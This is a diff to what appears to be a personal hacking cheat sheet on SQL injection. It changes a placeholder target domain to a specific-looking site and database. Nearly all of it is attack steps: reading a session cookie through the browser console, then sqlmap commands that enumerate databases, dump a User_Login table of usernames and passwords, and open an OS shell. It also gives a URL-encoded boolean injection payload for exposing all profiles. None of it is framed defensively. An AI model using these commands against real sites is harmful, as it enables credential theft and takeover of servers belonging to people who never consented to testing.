@@ -92,13 +92,13 @@ SQL Injections
 3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie
 Then copy the cookie value that was presented after this command. Then go to terminal and type this command,
 sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs
-4- Command to check tables of database retrieved-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables
-5- Select the table you want to dump (Get username and password)-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   
-6- For OS shell this is the command-   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
+4- Command to check tables of database retrieved-  sqlmap -u "http://www.roky.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D roky --tables 
+5- Select the table you want to dump (Get username and password)-  sqlmap -u "http://www.roky.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D roky -T User_Login --dump   
+6- For OS shell this is the command-   sqlmap -u "http://www.roky.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
 6.1 In the shell type-   TASKLIST  (to view the tasks)
 6.2 Use systeminfo for windows to get all os version
 6.3 Use uname -a for linux to get os version
-for blind sql injection to showing all profile in one profile so use this one http://www.XYZ.com/viewprofile.aspx?id=1%20OR%20NOT%20%28221%3E221%29
+for blind sql injection to showing all profile in one profile so use this one http://www.roky.com/viewprofile.aspx?id=1%20OR%20NOT%20%28221%3E221%29
 
 
 Android
